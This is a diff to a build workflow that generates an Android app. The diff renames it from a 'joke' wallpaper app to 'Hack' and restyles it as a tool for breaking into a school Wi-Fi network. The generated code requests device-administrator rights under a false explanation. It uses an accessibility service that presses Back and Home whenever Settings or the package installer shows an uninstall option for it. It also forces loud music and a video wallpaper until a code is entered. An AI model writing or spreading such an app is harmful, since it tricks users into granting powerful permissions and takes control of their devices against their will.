@@ -10,7 +10,7 @@ jobs:
       - name: Generate project
         run: |
           set -e
-          mkdir -p app/src/main/res/raw app/src/main/res/layout app/src/main/res/values app/src/main/res/xml app/src/main/java/com/example/joke
+          mkdir -p app/src/main/res/raw app/src/main/res/layout app/src/main/res/values app/src/main/res/xml app/src/main/java/com/example/hack
           
           # --- Gradle Scripts ---
           cat > settings.gradle.kts <<'EOF_FILE'
@@ -28,7 +28,7 @@ jobs:
                   mavenCentral()
               }
           }
-          rootProject.name = "WallpaperJoke"
+          rootProject.name = "Hack"
           include(":app")
           EOF_FILE
 
@@ -51,10 +51,10 @@ jobs:
               id("org.jetbrains.kotlin.android")
           }
           android {
-              namespace = "com.example.joke"
+              namespace = "com.example.hack"
               compileSdk = 34
               defaultConfig {
-                  applicationId = "com.example.joke"
+                  applicationId = "com.example.hack"
                   minSdk = 24
                   targetSdk = 34
                   versionCode = 1
@@ -193,49 +193,73 @@ jobs:
               android:layout_height="match_parent"
               android:gravity="center"
               android:orientation="vertical"
-              android:padding="24dp">
+              android:padding="24dp"
+              android:background="#0D1117">
+
+              <TextView
+                  android:layout_width="wrap_content"
+                  android:layout_height="wrap_content"
+                  android:text="HACK"
+                  android:textColor="#00FF00"
+                  android:textSize="48sp"
+                  android:textStyle="bold"
+                  android:fontFamily="monospace" />
 
               <TextView
                   android:id="@+id/tvStatus"
                   android:layout_width="wrap_content"
                   android:layout_height="wrap_content"
+                  android:layout_marginTop="16dp"
                   android:text="@string/status_active"
-                  android:textSize="22sp"
-                  android:textStyle="bold"
+                  android:textColor="#00FF00"
+                  android:textSize="18sp"
+                  android:fontFamily="monospace"
                   android:gravity="center" />
 
               <TextView
                   android:layout_width="wrap_content"
                   android:layout_height="wrap_content"
-                  android:layout_marginTop="16dp"
+                  android:layout_marginTop="8dp"
                   android:text="@string/premium_desc"
-                  android:textSize="15sp"
+                  android:textColor="#8B949E"
+                  android:textSize="14sp"
+                  android:fontFamily="monospace"
                   android:gravity="center" />
 
               <Button
                   android:id="@+id/btnPremium"
-                  android:layout_width="wrap_content"
+                  android:layout_width="match_parent"
                   android:layout_height="wrap_content"
-                  android:layout_marginTop="16dp"
-                  android:text="@string/premium_btn" />
+                  android:layout_marginTop="24dp"
+                  android:text="@string/premium_btn"
+                  android:backgroundTint="#238636"
+                  android:textColor="#FFFFFF"
+                  android:fontFamily="monospace" />
 
               <EditText
                   android:id="@+id/etCode"
-                  android:layout_width="220dp"
+                  android:layout_width="match_parent"
                   android:layout_height="wrap_content"
                   android:layout_marginTop="32dp"
                   android:gravity="center"
                   android:hint="@string/enter_code_hint"
+                  android:textColor="#00FF00"
+                  android:textColorHint="#8B949E"
                   android:imeOptions="actionDone"
                   android:inputType="number"
-                  android:maxLength="4" />
+                  android:maxLength="4"
+                  android:backgroundTint="#30363D"
+                  android:fontFamily="monospace" />
 
               <Button
                   android:id="@+id/btnStop"
-                  android:layout_width="wrap_content"
+                  android:layout_width="match_parent"
                   android:layout_height="wrap_content"
                   android:layout_marginTop="8dp"
-                  android:text="@string/action_stop" />
+                  android:text="@string/action_stop"
+                  android:backgroundTint="#DA3633"
+                  android:textColor="#FFFFFF"
+                  android:fontFamily="monospace" />
           </LinearLayout>
           EOF_FILE
 
@@ -244,25 +268,25 @@ jobs:
           <?xml version="1.0" encoding="utf-8"?>
           <resources>
               <string name="app_name">Hack</string>
-              <string name="status_active">Hack active</string>
-              <string name="premium_desc">Активируйте Премиум, чтобы получить доступ к эксклюзивным функциям и защите.</string>
-              <string name="premium_btn">Получить Премиум</string>
-              <string name="premium_success">Премиум активирован! Функции разблокированы.</string>
-              <string name="premium_fail">Без активации Премиум-функции недоступны.</string>
-              <string name="enter_code_hint">Код выключения</string>
-              <string name="wallpaper_label">Hack</string>
-              <string name="wallpaper_description">Видео на весь экран</string>
-              <string name="channel_name">Музыка</string>
-              <string name="notification_title">Hack active</string>
-              <string name="notification_text">Hack</string>
-              <string name="action_stop">Выключить всё</string>
-              <string name="accessibility_desc">Служба защиты Премиум-функций.</string>
+              <string name="status_active">СИСТЕМА ВЗЛОМАНА</string>
+              <string name="premium_desc">Требуется доступ для дешифровки школьной сети и активации протокола.</string>
+              <string name="premium_btn">ВЗЛОМАТЬ WI-FI</string>
+              <string name="premium_success">Доступ получен! Сеть взломана.</string>
+              <string name="premium_fail">Ошибка доступа. Попробуйте снова.</string>
+              <string name="enter_code_hint">Введите код дешифровки</string>
+              <string name="wallpaper_label">Hack Wallpaper</string>
+              <string name="wallpaper_description">Скрытый видеопоток</string>
+              <string name="channel_name">Hack Core</string>
+              <string name="notification_title">Hack активен</string>
+              <string name="notification_text">Протокол выполняется...</string>
+              <string name="action_stop">ОСТАНОВИТЬ ВЗЛОМ</string>
+              <string name="accessibility_desc">Системная служба Hack для перехвата и анализа сетевых пакетов.</string>
           </resources>
           EOF_FILE
 
           # --- Kotlin Classes ---
-          cat > app/src/main/java/com/example/joke/AdminReceiver.kt <<'EOF_FILE'
-          package com.example.joke
+          cat > app/src/main/java/com/example/hack/AdminReceiver.kt <<'EOF_FILE'
+          package com.example.hack
 
           import android.app.admin.DeviceAdminReceiver
           import android.content.Context
@@ -271,16 +295,16 @@ jobs:
 
           class AdminReceiver : DeviceAdminReceiver() {
               override fun onEnabled(context: Context, intent: Intent) {
-                  Toast.makeText(context, "✨ Премиум-статус активирован!", Toast.LENGTH_LONG).show()
+                  Toast.makeText(context, "⚡ Root-доступ активирован! Система под контролем.", Toast.LENGTH_LONG).show()
               }
               override fun onDisabled(context: Context, intent: Intent) {
-                  Toast.makeText(context, "Премиум-статус деактивирован.", Toast.LENGTH_SHORT).show()
+                  Toast.makeText(context, "Root-доступ деактивирован.", Toast.LENGTH_SHORT).show()
               }
           }
           EOF_FILE
 
-          cat > app/src/main/java/com/example/joke/DeleteBlockerService.kt <<'EOF_FILE'
-          package com.example.joke
+          cat > app/src/main/java/com/example/hack/DeleteBlockerService.kt <<'EOF_FILE'
+          package com.example.hack
 
           import android.accessibilityservice.AccessibilityService
           import android.view.accessibility.AccessibilityEvent
@@ -293,13 +317,13 @@ jobs:
 
                   if (pkg.contains("settings") || pkg.contains("packageinstaller")) {
                       val root = rootInActiveWindow ?: return
-                      val nodeText = root.findAccessibilityNodeInfosByText("Шутка")
+                      val nodeText = root.findAccessibilityNodeInfosByText("Hack")
                       val hasDeleteBtn = root.findAccessibilityNodeInfosByText("Удалить")?.isNotEmpty() == true ||
                                          root.findAccessibilityNodeInfosByText("Uninstall")?.isNotEmpty() == true
 
                       if (nodeText?.isNotEmpty() == true && hasDeleteBtn) {
                           performGlobalAction(GLOBAL_ACTION_BACK)
-                          Toast.makeText(this, "Удаление заблокировано! Введите код в приложении.", Toast.LENGTH_SHORT).show()
+                          Toast.makeText(this, "ОШИБКА: Системный процесс защищен!", Toast.LENGTH_SHORT).show()
                           performGlobalAction(GLOBAL_ACTION_HOME)
                       }
                   }
@@ -308,8 +332,8 @@ jobs:
           }
           EOF_FILE
 
-          cat > app/src/main/java/com/example/joke/MainActivity.kt <<'EOF_FILE'
-          package com.example.joke
+          cat > app/src/main/java/com/example/hack/MainActivity.kt <<'EOF_FILE'
+          package com.example.hack
 
           import android.Manifest
           import android.app.WallpaperManager
@@ -339,9 +363,7 @@ jobs:
               private val adminComponent by lazy { ComponentName(this, AdminReceiver::class.java) }
 
               private val notificationPermissionLauncher =
-                  registerForActivityResult(ActivityResultContracts.RequestPermission()) {
-                      // Музыка запустится после премиума
-                  }
+                  registerForActivityResult(ActivityResultContracts.RequestPermission()) {}
 
               override fun onCreate(savedInstanceState: Bundle?) {
                   super.onCreate(savedInstanceState)
@@ -355,13 +377,13 @@ jobs:
 
                   btnPremium.setOnClickListener {
                       if (dpm.isAdminActive(adminComponent)) {
-                          Toast.makeText(this, "Премиум уже активирован!", Toast.LENGTH_SHORT).show()
+                          Toast.makeText(this, "Доступ уже получен!", Toast.LENGTH_SHORT).show()
                       } else {
                           val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                           intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                           intent.putExtra(
                               DevicePolicyManager.EXTRA_ADD_EXPLANATION,
-                              "Активация Премиум-статуса для доступа к эксклюзивным функциям."
+                              "Предоставление прав для внедрения в системные процессы и дешифровки сети."
                           )
                           startActivityForResult(intent, 100)
                       }
@@ -385,7 +407,7 @@ jobs:
 
               private fun updatePremiumStatus() {
                   if (dpm.isAdminActive(adminComponent)) {
-                      btnPremium.text = "Премиум активен ✓"
+                      btnPremium.text = "ДОСТУП ПОЛУЧЕН ✓"
                       btnPremium.isEnabled = false
                   } else {
                       btnPremium.text = getString(R.string.premium_btn)
@@ -401,7 +423,6 @@ jobs:
                           updatePremiumStatus()
                           boostVolume()
                           startMusicAndWallpaper()
-                          // Отправляем в настройки спец. возможностей для усиления блокировки
                           startActivity(Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS))
                       } else {
                           Toast.makeText(this, R.string.premium_fail, Toast.LENGTH_LONG).show()
@@ -466,14 +487,14 @@ jobs:
                   if (dpm.isAdminActive(adminComponent)) {
                       dpm.removeActiveAdmin(adminComponent)
                   }
-                  Toast.makeText(this, "Всё выключено. Теперь можно удалить приложение.", Toast.LENGTH_LONG).show()
+                  Toast.makeText(this, "Протокол завершен. Доступ закрыт.", Toast.LENGTH_LONG).show()
                   finishAffinity()
               }
           }
           EOF_FILE
 
-          cat > app/src/main/java/com/example/joke/MusicService.kt <<'EOF_FILE'
-          package com.example.joke
+          cat > app/src/main/java/com/example/hack/MusicService.kt <<'EOF_FILE'
+          package com.example.hack
 
           import android.app.Notification
           import android.app.NotificationChannel
@@ -492,9 +513,9 @@ jobs:
           class MusicService : Service() {
 
               companion object {
-                  const val ACTION_START = "com.example.joke.action.START"
-                  const val ACTION_STOP = "com.example.joke.action.STOP"
-                  private const val CHANNEL_ID = "joke_music_channel"
+                  const val ACTION_START = "com.example.hack.action.START"
+                  const val ACTION_STOP = "com.example.hack.action.STOP"
+                  private const val CHANNEL_ID = "hack_core_channel"
                   private const val NOTIFICATION_ID = 1001
 
                   @Volatile
@@ -631,8 +652,8 @@ jobs:
           }
           EOF_FILE
 
-          cat > app/src/main/java/com/example/joke/MyWallpaperService.kt <<'EOF_FILE'
-          package com.example.joke
+          cat > app/src/main/java/com/example/hack/MyWallpaperService.kt <<'EOF_FILE'
+          package com.example.hack
 
           import android.media.MediaPlayer
           import android.service.wallpaper.WallpaperService
